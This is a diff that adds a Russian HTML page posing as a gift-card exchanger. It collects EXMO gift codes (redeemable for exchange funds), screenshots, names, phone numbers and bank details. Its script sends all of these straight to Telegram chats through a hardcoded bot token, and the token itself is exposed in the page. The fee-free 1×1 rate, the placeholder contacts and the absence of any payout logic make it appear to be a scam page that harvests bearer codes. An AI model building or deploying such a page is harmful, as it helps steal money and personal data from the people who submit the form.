@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Продать EXMO код - Обменник gift-карт</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <video autoplay muted loop playsinline class="video-background">
+        <source src="19264a464315513c06c2dc242649e340.mp4" type="video/mp4">
+    </video>
+
+    <header>
+        <div class="user-bar">
+            <div class="container">
+                <div class="user-bar-content">
+                    <div class="header-contacts-top">
+                        <span><svg style="width:16px;height:16px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#0088cc"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.5 8.1l-1.8 8.5c-.13.6-.5.75-.95.47l-2.6-1.9-1.25 1.2c-.14.14-.26.26-.53.26l.18-2.6 4.8-4.3c.2-.2-.05-.3-.3-.12l-5.9 3.7-2.55-.8c-.55-.17-.56-.55.12-.82l10-3.85c.45-.17.85.1.7.8z"/></svg> <a href="https://t.me/yourusername" target="_blank">@yourusername</a></span>
+                        <span><svg style="width:16px;height:16px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#EA4335"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg> support@example.com</span>
+                    </div>
+                    <div class="auth-buttons-header">
+                        <button class="btn-login-header" onclick="window.location.href='login.html'">Войти</button>
+                        <button class="btn-register-header" onclick="window.location.href='register.html'">Регистрация</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="main-header">
+            <div class="container">
+                <div class="header-content">
+                    <div class="logo">
+                        <h1>Обменник gift-карт</h1>
+                    </div>
+                    <nav>
+                        <a href="index.html">Главная</a>
+                        <a href="#reviews">Отзывы</a>
+                        <a href="#howto">Как это работает</a>
+                        <a href="#contacts">Контакты</a>
+                    </nav>
+                    <div class="work-time">
+                        <span>⏰ Работаем: 24 часа 7 дней в неделю</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <section class="exchange-main-section">
+            <div class="container">
+                <div class="exchange-info">
+                    <h2 id="pageTitle">Обменник gift-карт</h2>
+                    <p class="exchange-conditions">Курс обмена 1×1 без комиссии. Быстрая оплата через СБП. Минимальная сумма обмена — 1 000 ₽, максимальная — 100 000 ₽. Время обработки заявки: 10-30 минут.</p>
+                </div>
+
+                <form id="sellForm" class="main-exchange-form">
+                    <div class="exchange-columns">
+                        <div class="exchange-column">
+                            <div class="form-group">
+                                <label>💳 Вставить код *</label>
+                                <input type="text" id="exmoCode" name="exmoCode" required
+                                       placeholder="Вставьте Gift Card (EXMO код)">
+                                <small>Gift Card (EXMO код), созданный в личном кабинете биржи пользователя</small>
+                            </div>
+
+                            <div class="form-group">
+                                <label>💰 Сумма *</label>
+                                <input type="number" id="giveAmount" name="giveAmount" required
+                                       placeholder="Укажите сумму" min="1000" max="100000" step="1">
+                                <small>min: 1 000 RUB | max: 100 000 RUB</small>
+                            </div>
+
+                            <div class="form-group">
+                                <label>📎 Файл подтверждения *</label>
+                                <input type="file" id="screenshot" name="screenshot" required
+                                       accept="image/*">
+                                <small>Скриншот с видимым EXMO кодом</small>
+                            </div>
+                        </div>
+
+                        <div class="exchange-column">
+                            <div class="form-group">
+                                <label>💵 Сумма к получению</label>
+                                <input type="number" id="receiveAmount" name="receiveAmount" readonly
+                                       placeholder="0" class="amount-display">
+                                <small>Курс обмена 1×1 • Оплата через СБП</small>
+                            </div>
+
+                            <div class="form-group">
+                                <label>👤 Ф.И.О. получателя *</label>
+                                <input type="text" id="fullName" name="fullName" required
+                                       placeholder="Иванов Иван Иванович">
+                            </div>
+
+                            <div class="form-group">
+                                <label>📱 Номер телефона (СБП) *</label>
+                                <input type="tel" id="phone" name="phone" required
+                                       placeholder="+7 (___) ___-__-__">
+                            </div>
+
+                            <div class="form-group">
+                                <label>🏦 Название банка *</label>
+                                <input type="text" id="bank" name="bank" required
+                                       placeholder="Введите название вашего банка">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-agreement">
+                        <label class="checkbox-label">
+                            <input type="checkbox" required>
+                            <span>Я согласен с <a href="terms.html" target="_blank" style="color: #007bff;">условиями обмена</a> и <a href="privacy.html" target="_blank" style="color: #007bff;">политикой конфиденциальности</a></span>
+                        </label>
+                    </div>
+
+                    <button type="submit" class="btn-submit-exchange">Создать заявку</button>
+                </form>
+
+                <div id="successMessage" class="message success" style="display:none;">
+                    ✓ Заявка успешно отправлена! Мы свяжемся с вами в ближайшее время.
+                </div>
+                <div id="errorMessage" class="message error" style="display:none;">
+                    ✗ Ошибка отправки. Попробуйте еще раз или свяжитесь с нами в Telegram.
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer id="contacts">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>Контакты</h3>
+                    <p><svg style="width:14px;height:14px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#0088cc"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.5 8.1l-1.8 8.5c-.13.6-.5.75-.95.47l-2.6-1.9-1.25 1.2c-.14.14-.26.26-.53.26l.18-2.6 4.8-4.3c.2-.2-.05-.3-.3-.12l-5.9 3.7-2.55-.8c-.55-.17-.56-.55.12-.82l10-3.85c.45-.17.85.1.7.8z"/></svg> <a href="https://t.me/yourusername" target="_blank">@yourusername</a></p>
+                    <p><svg style="width:14px;height:14px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#EA4335"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg> support@example.com</p>
+                </div>
+                <div class="footer-section">
+                    <h3>Режим работы</h3>
+                    <p>24 часа 7 дней в неделю</p>
+                    <p>Обработка заявок: 10-30 минут</p>
+                </div>
+                <div class="footer-section">
+                    <h3>Информация</h3>
+                    <p>Курс обмена: 1×1</p>
+                    <p>Комиссия: 0%</p>
+                    <p>Способ оплаты: СБП</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 Обменник gift-карт. Все права защищены.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Автоматический расчёт суммы получения (курс 1×1)
+        const giveAmountInput = document.getElementById('giveAmount');
+        const receiveAmountInput = document.getElementById('receiveAmount');
+
+        giveAmountInput.addEventListener('input', function(e) {
+            const amount = parseFloat(e.target.value) || 0;
+            receiveAmountInput.value = amount;
+        });
+
+        // Форматирование телефона
+        function formatPhone(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                if (value[0] === '8') value = '7' + value.substring(1);
+                if (value[0] !== '7') value = '7' + value;
+            }
+            let formatted = '+7';
+            if (value.length > 1) formatted += ' (' + value.substring(1, 4);
+            if (value.length >= 5) formatted += ') ' + value.substring(4, 7);
+            if (value.length >= 8) formatted += '-' + value.substring(7, 9);
+            if (value.length >= 10) formatted += '-' + value.substring(9, 11);
+            e.target.value = formatted;
+        }
+
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', formatPhone);
+
+        // Отправка в Telegram с фото
+        async function sendToTelegram(order, screenshotFile) {
+            const BOT_TOKEN = '8378403510:AAHdYIpQ2hRJ8H0va6kM-ZSfoYwVeosuQVA';
+            const ADMIN_IDS = ['7338817463', '7816621862'];
+
+            const message =
+                `📋 <b>Новая заявка</b>\n\n` +
+                `💳 <code>${order.exmoCode}</code>\n` +
+                `💰 ${order.giveAmount} руб.\n\n` +
+                `👤 <code>${order.fullName}</code>\n` +
+                `📱 <code>${order.phone}</code>\n` +
+                `🏦 <code>${order.bank}</code>`;
+
+            for (const chatId of ADMIN_IDS) {
+                try {
+                    if (screenshotFile) {
+                        // Сначала отправляем фото
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', screenshotFile);
+                        formData.append('caption', message);
+                        formData.append('parse_mode', 'HTML');
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } else {
+                        // Без фото - только текст
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                    }
+                } catch (err) {
+                    console.log('Telegram error:', err);
+                }
+            }
+        }
+
+        // Отправка формы
+        document.getElementById('sellForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const giveAmount = parseFloat(document.getElementById('giveAmount').value);
+
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+
+            // Валидация лимитов
+            if (giveAmount < 1000 || giveAmount > 100000) {
+                errorMessage.textContent = '✗ Сумма должна быть от 1 000 до 100 000 рублей.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            // Сохраняем заявку в LocalStorage
+            const orders = JSON.parse(localStorage.getItem('orders') || '[]');
+
+            const newOrder = {
+                id: orders.length + 1,
+                type: 'sell',
+                exmoCode: document.getElementById('exmoCode').value,
+                giveAmount: giveAmount,
+                receiveAmount: giveAmount,
+                fullName: document.getElementById('fullName').value,
+                phone: document.getElementById('phone').value,
+                bank: document.getElementById('bank').value,
+                status: 'pending',
+                createdAt: new Date().toISOString()
+            };
+
+            orders.push(newOrder);
+            localStorage.setItem('orders', JSON.stringify(orders));
+
+            // Получаем файл скриншота
+            const screenshotInput = document.getElementById('screenshot');
+            const screenshotFile = screenshotInput.files[0] || null;
+
+            // Отправляем в Telegram с фото
+            sendToTelegram(newOrder, screenshotFile);
+
+            successMessage.style.display = 'block';
+            this.reset();
+            receiveAmountInput.value = '0';
+
+            setTimeout(() => {
+                successMessage.style.display = 'none';
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
